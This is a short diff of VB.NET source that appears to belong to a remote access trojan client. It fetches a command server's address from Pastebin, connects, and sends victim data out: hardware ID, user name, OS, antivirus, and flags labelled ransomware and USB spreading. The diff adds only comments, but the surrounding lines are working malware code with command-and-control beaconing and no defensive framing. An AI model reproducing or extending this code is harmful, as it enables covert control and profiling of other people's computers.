@@ -85,7 +85,7 @@ e:      ' clear things and ReConnect
             lp = 0
 
             Try
-                Dim WC As WebClient = New WebClient()
+                Dim WC As WebClient = New WebClient() 'Pastebin, split by ":" IP:PORT
                 Dim reply As String = WC.DownloadString(Settings.Pastebin)
                 Settings.HOST = reply.Split(":")(0)
                 Settings.PORT = reply.Split(":")(1)
@@ -95,6 +95,7 @@ e:      ' clear things and ReConnect
 
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CN = True
+            'Send info to server
             Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.5.2" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(2500)
